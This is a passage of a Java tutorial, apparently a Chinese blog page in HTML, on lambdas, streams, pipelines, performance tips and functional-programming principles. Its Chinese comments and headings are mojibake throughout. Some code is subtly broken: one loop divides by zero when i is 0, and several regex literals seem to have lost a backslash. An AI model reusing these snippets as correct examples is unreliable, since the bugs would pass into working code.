            List&lt;String&gt; names = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            <span class="hljs-keyword">for</span> (Order order : orders) {
                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> order.getCustomerName();
                <span class="hljs-keyword">if</span> (name != <span class="hljs-literal">null</span> &amp;&amp; !names.contains(name)) {
                    names.add(name);
                }
            }
            Collections.sort(names);
            <span class="hljs-keyword">return</span> names;
        }
    }
    
    <span class="hljs-comment">// å‡½æ•°å¼æ–¹å¼</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionalOrderProcessor</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalRevenue</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
            <span class="hljs-keyword">return</span> orders.stream()
                .filter(order -&gt; order.getStatus() == OrderStatus.COMPLETED)
                .flatMap(order -&gt; order.getItems().stream())
                .mapToDouble(item -&gt; item.getPrice() * item.getQuantity())
                .sum();
        }
        
        <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getCustomerNames</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
            <span class="hljs-keyword">return</span> orders.stream()
                .map(Order::getCustomerName)
                .filter(Objects::nonNull)
                .distinct()
                .sorted()
                .collect(Collectors.toList());
        }
        
        <span class="hljs-comment">// æ›´å¤šå‡½æ•°å¼æ“ä½œç¤ºä¾‹</span>
        <span class="hljs-keyword">public</span> Map&lt;OrderStatus, Long&gt; <span class="hljs-title function_">countOrdersByStatus</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
            <span class="hljs-keyword">return</span> orders.stream()
                .collect(Collectors.groupingBy(
                    Order::getStatus,
                    Collectors.counting()
                ));
        }
        
        <span class="hljs-keyword">public</span> Optional&lt;Order&gt; <span class="hljs-title function_">findMostExpensiveOrder</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
            <span class="hljs-keyword">return</span> orders.stream()
                .max(Comparator.comparingDouble(order -&gt;
                    order.getItems().stream()
                        .mapToDouble(item -&gt; item.getPrice() * item.getQuantity())
                        .sum()
                ));
        }
        
        <span class="hljs-keyword">public</span> Map&lt;String, Double&gt; <span class="hljs-title function_">getCustomerTotalSpent</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
            <span class="hljs-keyword">return</span> orders.stream()
                .filter(order -&gt; order.getStatus() == OrderStatus.COMPLETED)
                .collect(Collectors.groupingBy(
                    Order::getCustomerName,
                    Collectors.summingDouble(order -&gt;
                        order.getItems().stream()
                            .mapToDouble(item -&gt; item.getPrice() * item.getQuantity())
                            .sum()
                    )
                ));
        }
    }
    
    <span class="hljs-comment">// å®ä½“ç±»</span>
    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">OrderStatus</span> { PENDING, PROCESSING, COMPLETED, CANCELLED }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {
        <span class="hljs-keyword">private</span> String customerName;
        <span class="hljs-keyword">private</span> OrderStatus status;
        <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
        
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCustomerName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> customerName; }
        <span class="hljs-keyword">public</span> OrderStatus <span class="hljs-title function_">getStatus</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> status; }
        <span class="hljs-keyword">public</span> List&lt;OrderItem&gt; <span class="hljs-title function_">getItems</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> items; }
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {
        <span class="hljs-keyword">private</span> String productName;
        <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
        
        <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> price; }
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQuantity</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> quantity; }
    }
}
</code></pre>
<h3 data-id="heading-13">æ¡ˆä¾‹2ï¼šæ„å»ºæ•°æ®å¤„ç†ç®¡é“</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.*;
<span class="hljs-keyword">import</span> java.util.function.*;
<span class="hljs-keyword">import</span> java.util.stream.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessingPipeline</span> {
    
    <span class="hljs-comment">// æ„å»ºå¯é‡ç”¨çš„æ•°æ®å¤„ç†ç®¡é“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PipelineBuilder</span>&lt;T, R&gt; {
        <span class="hljs-keyword">private</span> List&lt;Function&lt;T, T&gt;&gt; processors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">private</span> Function&lt;T, R&gt; finisher;
        
        <span class="hljs-keyword">public</span> PipelineBuilder&lt;T, R&gt; <span class="hljs-title function_">addProcessor</span><span class="hljs-params">(Function&lt;T, T&gt; processor)</span> {
            processors.add(processor);
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> PipelineBuilder&lt;T, R&gt; <span class="hljs-title function_">setFinisher</span><span class="hljs-params">(Function&lt;T, R&gt; finisher)</span> {
            <span class="hljs-built_in">this</span>.finisher = finisher;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> R <span class="hljs-title function_">process</span><span class="hljs-params">(T input)</span> {
            <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> input;
            <span class="hljs-keyword">for</span> (Function&lt;T, T&gt; processor : processors) {
                result = processor.apply(result);
            }
            <span class="hljs-keyword">return</span> finisher.apply(result);
        }
        
        <span class="hljs-comment">// ä½¿ç”¨Streamæ„å»ºæ›´çµæ´»çš„ç®¡é“</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T, R&gt; Function&lt;T, R&gt; <span class="hljs-title function_">buildPipeline</span><span class="hljs-params">(
                List&lt;Function&lt;T, T&gt;&gt; processors,
                Function&lt;T, R&gt; finisher)</span> {
            
            <span class="hljs-keyword">return</span> input -&gt; {
                <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> input;
                <span class="hljs-keyword">for</span> (Function&lt;T, T&gt; processor : processors) {
                    result = processor.apply(result);
                }
                <span class="hljs-keyword">return</span> finisher.apply(result);
            };
        }
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæ–‡æœ¬å¤„ç†ç®¡é“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">textProcessingExample</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ„å»ºæ–‡æœ¬å¤„ç†ç®¡é“</span>
        Function&lt;String, String&gt; textPipeline = PipelineBuilder.buildPipeline(
            Arrays.asList(
                String::trim,                      <span class="hljs-comment">// 1. å»é™¤é¦–å°¾ç©ºæ ¼</span>
                s -&gt; s.replaceAll(<span class="hljs-string">"\s+"</span>, <span class="hljs-string">" "</span>),    <span class="hljs-comment">// 2. åˆå¹¶å¤šä¸ªç©ºæ ¼</span>
                String::toLowerCase,               <span class="hljs-comment">// 3. è½¬ä¸ºå°å†™</span>
                s -&gt; s.replaceAll(<span class="hljs-string">"[^a-z0-9\s]"</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">// 4. ç§»é™¤éå­—æ¯æ•°å­—</span>
            ),
            String::toString                       <span class="hljs-comment">// æœ€ç»ˆå¤„ç†</span>
        );
        
        <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">"  Hello,   WORLD!!  This is   a TEST.  "</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> textPipeline.apply(input);
        System.out.println(<span class="hljs-string">"è¾“å…¥: "</span> + input);
        System.out.println(<span class="hljs-string">"è¾“å‡º: "</span> + output);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæ•°å­—å¤„ç†ç®¡é“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">numberProcessingExample</span><span class="hljs-params">()</span> {
        List&lt;Integer&gt; numbers = Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>);
        
        <span class="hljs-comment">// æ„å»ºæ•°å­—å¤„ç†ç®¡é“</span>
        Function&lt;List&lt;Integer&gt;, Map&lt;String, Object&gt;&gt; numberPipeline = 
            PipelineBuilder.buildPipeline(
                Arrays.asList(
                    list -&gt; list.stream()                     <span class="hljs-comment">// è½¬ä¸ºStream</span>
                                .filter(n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)     <span class="hljs-comment">// è¿‡æ»¤å¶æ•°</span>
                                .collect(Collectors.toList()),
                    
                    list -&gt; list.stream()                     <span class="hljs-comment">// å†æ¬¡è½¬ä¸ºStream</span>
                                .map(n -&gt; n * n)              <span class="hljs-comment">// å¹³æ–¹</span>
                                .collect(Collectors.toList())
                ),
                list -&gt; {
                    <span class="hljs-comment">// è®¡ç®—å„ç§ç»Ÿè®¡ä¿¡æ¯</span>
                    <span class="hljs-type">IntSummaryStatistics</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> list.stream()
                        .mapToInt(Integer::intValue)
                        .summaryStatistics();
                    
                    Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
                    result.put(<span class="hljs-string">"æ•°æ®"</span>, list);
                    result.put(<span class="hljs-string">"æ€»å’Œ"</span>, stats.getSum());
                    result.put(<span class="hljs-string">"å¹³å‡å€¼"</span>, stats.getAverage());
                    result.put(<span class="hljs-string">"æœ€å¤§å€¼"</span>, stats.getMax());
                    result.put(<span class="hljs-string">"æœ€å°å€¼"</span>, stats.getMin());
                    result.put(<span class="hljs-string">"æ•°é‡"</span>, stats.getCount());
                    
                    <span class="hljs-keyword">return</span> result;
                }
            );
        
        Map&lt;String, Object&gt; result = numberPipeline.apply(numbers);
        System.out.println(<span class="hljs-string">"å¤„ç†ç»“æœ:"</span>);
        result.forEach((key, value) -&gt; System.out.println(key + <span class="hljs-string">": "</span> + value));
    }
}
</code></pre>
<h2 data-id="heading-14">æ€§èƒ½ä¼˜åŒ–ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-15">Lambdaè¡¨è¾¾å¼çš„æ€§èƒ½è€ƒè™‘</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LambdaPerformance</span> {
    
    <span class="hljs-comment">// åŸºå‡†æµ‹è¯•ï¼šLambda vs åŒ¿åå†…éƒ¨ç±»</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performanceComparison</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">iterations</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000000</span>;
        
        <span class="hljs-comment">// æµ‹è¯•Lambdaè¡¨è¾¾å¼</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">lambdaStart</span> <span class="hljs-operator">=</span> System.nanoTime();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iterations; i++) {
            <span class="hljs-type">Runnable</span> <span class="hljs-variable">lambda</span> <span class="hljs-operator">=</span> () -&gt; System.out.println(<span class="hljs-string">"Lambda"</span>);
        }
        <span class="hljs-type">long</span> <span class="hljs-variable">lambdaTime</span> <span class="hljs-operator">=</span> System.nanoTime() - lambdaStart;
        
        <span class="hljs-comment">// æµ‹è¯•åŒ¿åå†…éƒ¨ç±»</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">anonStart</span> <span class="hljs-operator">=</span> System.nanoTime();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iterations; i++) {
            <span class="hljs-type">Runnable</span> <span class="hljs-variable">anon</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
                <span class="hljs-meta">@Override</span>
                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                    System.out.println(<span class="hljs-string">"Anonymous"</span>);
                }
            };
        }
        <span class="hljs-type">long</span> <span class="hljs-variable">anonTime</span> <span class="hljs-operator">=</span> System.nanoTime() - anonStart;
        
        System.out.println(<span class="hljs-string">"Lambdaåˆ›å»ºæ—¶é—´: "</span> + lambdaTime + <span class="hljs-string">" ns"</span>);
        System.out.println(<span class="hljs-string">"åŒ¿åç±»åˆ›å»ºæ—¶é—´: "</span> + anonTime + <span class="hljs-string">" ns"</span>);
        System.out.println(<span class="hljs-string">"æ€§èƒ½å·®å¼‚: "</span> + (anonTime - lambdaTime) + <span class="hljs-string">" ns"</span>);
    }
    
    <span class="hljs-comment">// Streamçš„æ€§èƒ½ä¼˜åŒ–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">streamPerformanceTips</span><span class="hljs-params">()</span> {
        List&lt;Integer&gt; numbers = IntStream.rangeClosed(<span class="hljs-number">1</span>, <span class="hljs-number">1000000</span>)
            .boxed()
            .collect(Collectors.toList());
        
        <span class="hljs-comment">// æ€§èƒ½é™·é˜±1ï¼šé¢‘ç¹è£…ç®±æ‹†ç®±</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">slowSum</span> <span class="hljs-operator">=</span> numbers.stream()
            .reduce(<span class="hljs-number">0</span>, (a, b) -&gt; a + b);  <span class="hljs-comment">// æ¯æ¬¡æ“ä½œéƒ½æœ‰è£…ç®±æ‹†ç®±</span>
        
        <span class="hljs-type">long</span> <span class="hljs-variable">fastSum</span> <span class="hljs-operator">=</span> numbers.stream()
            .mapToInt(Integer::intValue)   <span class="hljs-comment">// è½¬ä¸ºIntStreamé¿å…è£…ç®±</span>
            .sum();
        
        <span class="hljs-comment">// æ€§èƒ½é™·é˜±2ï¼šä¸å¿…è¦çš„æ’åº</span>
        List&lt;Integer&gt; result = numbers.stream()
            .sorted()                      <span class="hljs-comment">// ä¸å¿…è¦çš„æ’åºå¼€é”€</span>
            .filter(n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)
            .collect(Collectors.toList());
        
        <span class="hljs-comment">// ä¼˜åŒ–ï¼šå…ˆè¿‡æ»¤å†æ’åº</span>
        List&lt;Integer&gt; optimized = numbers.stream()
            .filter(n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)
            .sorted()                      <span class="hljs-comment">// æ•°æ®é‡å‡å°‘åå†æ’åº</span>
            .collect(Collectors.toList());
        
        <span class="hljs-comment">// æ€§èƒ½é™·é˜±3ï¼šé‡å¤åˆ›å»ºStream</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
            <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> numbers.stream()   <span class="hljs-comment">// æ¯æ¬¡å¾ªç¯éƒ½åˆ›å»ºæ–°Stream</span>
                .filter(n -&gt; n % i == <span class="hljs-number">0</span>)
                .count();
        }
        
        <span class="hljs-comment">// ä¼˜åŒ–ï¼šé‡ç”¨Streamæ“ä½œ</span>
        <span class="hljs-type">LongUnaryOperator</span> <span class="hljs-variable">counter</span> <span class="hljs-operator">=</span> divisor -&gt; numbers.stream()
            .filter(n -&gt; n % divisor == <span class="hljs-number">0</span>)
            .count();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++) {
            <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> counter.applyAsLong(i);
        }
    }
    
    <span class="hljs-comment">// å¹¶è¡ŒStreamçš„æ­£ç¡®ä½¿ç”¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parallelStreamBestPractices</span><span class="hljs-params">()</span> {
        List&lt;Integer&gt; numbers = IntStream.rangeClosed(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>)
            .boxed()
            .collect(Collectors.toList());
        
        <span class="hljs-comment">// åˆé€‚ä½¿ç”¨å¹¶è¡ŒStreamçš„æƒ…å†µ</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">parallelTime</span> <span class="hljs-operator">=</span> measureTime(() -&gt; 
            numbers.parallelStream()
                .filter(n -&gt; isPrime(n))  <span class="hljs-comment">// è®¡ç®—å¯†é›†æ“ä½œ</span>
                .count()
        );
        
        <span class="hljs-comment">// ä¸åˆé€‚ä½¿ç”¨å¹¶è¡ŒStreamçš„æƒ…å†µ</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">sequentialTime</span> <span class="hljs-operator">=</span> measureTime(() -&gt; 
            numbers.stream()
                .filter(n -&gt; n &lt; <span class="hljs-number">100</span>)     <span class="hljs-comment">// ç®€å•æ“ä½œï¼Œå¹¶è¡Œå¼€é”€å¤§</span>
                .count()
        );
        
        System.out.println(<span class="hljs-string">"å¹¶è¡Œæ—¶é—´: "</span> + parallelTime + <span class="hljs-string">"ms"</span>);
        System.out.println(<span class="hljs-string">"é¡ºåºæ—¶é—´: "</span> + sequentialTime + <span class="hljs-string">"ms"</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isPrime</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> {
        <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; i &lt;= Math.sqrt(n); i++) {
            <span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">measureTime</span><span class="hljs-params">(Runnable task)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        task.run();
        <span class="hljs-keyword">return</span> System.currentTimeMillis() - start;
    }
}
</code></pre>
<h2 data-id="heading-16">å‡½æ•°å¼ç¼–ç¨‹çš„æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-17">åŸåˆ™1ï¼šä¸å˜æ€§</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¯å˜ç±»ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImmutablePerson</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> age;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;String&gt; hobbies;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ImmutablePerson</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, List&lt;String&gt; hobbies)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
        <span class="hljs-built_in">this</span>.hobbies = Collections.unmodifiableList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(hobbies));
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> name; }
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> age; }
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getHobbies</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> hobbies; }
    
    <span class="hljs-comment">// ä½¿ç”¨withæ¨¡å¼åˆ›å»ºæ–°å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> ImmutablePerson <span class="hljs-title function_">withName</span><span class="hljs-params">(String newName)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImmutablePerson</span>(newName, age, hobbies);
    }
    
    <span class="hljs-keyword">public</span> ImmutablePerson <span class="hljs-title function_">withAge</span><span class="hljs-params">(<span class="hljs-type">int</span> newAge)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImmutablePerson</span>(name, newAge, hobbies);
    }
}
</code></pre>
<h3 data-id="heading-18">åŸåˆ™2ï¼šçº¯å‡½æ•°</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PureFunctions</span> {
    
    <span class="hljs-comment">// çº¯å‡½æ•°ï¼šç›¸åŒè¾“å…¥æ€»æ˜¯äº§ç”Ÿç›¸åŒè¾“å‡ºï¼Œæ— å‰¯ä½œç”¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a + b;
    }
    
    <span class="hljs-comment">// éçº¯å‡½æ•°ï¼šæœ‰å‰¯ä½œç”¨ï¼ˆä¿®æ”¹å¤–éƒ¨çŠ¶æ€ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">counter</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> ++counter;  <span class="hljs-comment">// æœ‰å‰¯ä½œç”¨</span>
    }
    
    <span class="hljs-comment">// éçº¯å‡½æ•°ï¼šä¾èµ–å¤–éƒ¨çŠ¶æ€</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCurrentTime</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>) System.currentTimeMillis();  <span class="hljs-comment">// ç»“æœéšæ—¶é—´å˜åŒ–</span>
    }
    
    <span class="hljs-comment">// çº¯å‡½æ•°å¼æ“ä½œåˆ—è¡¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; <span class="hljs-title function_">squareList</span><span class="hljs-params">(List&lt;Integer&gt; numbers)</span> {
        <span class="hljs-keyword">return</span> numbers.stream()
            .map(n -&gt; n * n)  <span class="hljs-comment">// çº¯å‡½æ•°æ“ä½œ</span>
            .collect(Collectors.toList());
    }
}
</code></pre>
<h3 data-id="heading-19">åŸåˆ™3ï¼šå‡½æ•°ç»„åˆ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionComposition</span> {
    
    <span class="hljs-comment">// åŸºç¡€å‡½æ•°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Function&lt;Integer, Integer&gt; add = x -&gt; x + <span class="hljs-number">1</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Function&lt;Integer, Integer&gt; multiply = x -&gt; x * <span class="hljs-number">2</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Function&lt;Integer, Integer&gt; square = x -&gt; x * x;
    
    <span class="hljs-comment">// æ‰‹åŠ¨ç»„åˆ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Function&lt;Integer, Integer&gt; addThenMultiply = x -&gt; multiply.apply(add.apply(x));
    
    <span class="hljs-comment">// ä½¿ç”¨andThen/composeç»„åˆ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Function&lt;Integer, Integer&gt; composed1 = add.andThen(multiply).andThen(square);
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Function&lt;Integer, Integer&gt; composed2 = square.compose(multiply).compose(add);
    
    <span class="hljs-comment">// åˆ›å»ºé€šç”¨ç»„åˆå™¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; Function&lt;T, T&gt; <span class="hljs-title function_">composeAll</span><span class="hljs-params">(List&lt;Function&lt;T, T&gt;&gt; functions)</span> {
        <span class="hljs-keyword">return</span> functions.stream()
            .reduce(Function.identity(), Function::andThen);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæ•°æ®å¤„ç†ç®¡é“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataProcessingPipeline</span><span class="hljs-params">()</span> {
        List&lt;Function&lt;String, String&gt;&gt; textProcessors = Arrays.asList(
            String::trim,
            s -&gt; s.replaceAll(<span class="hljs-string">"\s+"</span>, <span class="hljs-string">" "</span>),
            String::toLowerCase,
            s -&gt; s.replaceAll(<span class="hljs-string">"[^a-z ]"</span>, <span class="hljs-string">""</span>)
        );
        
        Function&lt;String, String&gt; textPipeline = composeAll(textProcessors);
        
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> textPipeline.apply(<span class="hljs-string">"  HELLO   WORLD!!  "</span>);
        System.out.println(result);  <span class="hljs-comment">// è¾“å‡º: hello world</span>
    }
}
</code></pre>
<h2 data-id="heading-20">æ€»ç»“ä¸è¿›é˜¶å­¦ä¹ </h2>
<h3 data-id="heading-21">å‡½æ•°å¼ç¼–ç¨‹çš„ä¼˜åŠ¿</h3>
<ol>
<li><strong>ä»£ç ç®€æ´</strong>ï¼šå‡å°‘æ¨¡æ¿ä»£ç ï¼Œæé«˜è¡¨è¾¾åŠ›</li>
<li><strong>æ˜“äºå¹¶è¡Œ</strong>ï¼šä¸å˜æ€§å’Œçº¯å‡½æ•°å¤©ç„¶é€‚åˆå¹¶è¡Œå¤„ç†</li>
<li><strong>å¯æµ‹è¯•æ€§</strong>ï¼šçº¯å‡½æ•°æ›´å®¹æ˜“æµ‹è¯•</li>
<li><strong>ç»„åˆæ€§</strong>ï¼šå‡½æ•°å¯ä»¥åƒä¹é«˜ç§¯æœ¨ä¸€æ ·ç»„åˆ</li>
</ol>
<h3 data-id="heading-22">å¸¸è§é™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonPitfalls</span> {
    
    <span class="hljs-comment">// é™·é˜±1ï¼šåœ¨Lambdaä¸­ä¿®æ”¹å¤–éƒ¨å˜é‡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pitfall1</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        List&lt;String&gt; items = Arrays.asList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
        
        <span class="hljs-comment">// âŒ é”™è¯¯ï¼šåœ¨Lambdaä¸­ä¿®æ”¹å±€éƒ¨å˜é‡</span>
        <span class="hljs-comment">// items.forEach(s -&gt; count++);  // ç¼–è¯‘é”™è¯¯</span>
        
        <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨Atomicç±»å‹æˆ–æ”¶é›†ç»“æœ</span>
        <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">atomicCount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
        items.forEach(s -&gt; atomicCount.incrementAndGet());
        
        <span class="hljs-type">long</span> <span class="hljs-variable">correctCount</span> <span class="hljs-operator">=</span> items.stream().count();
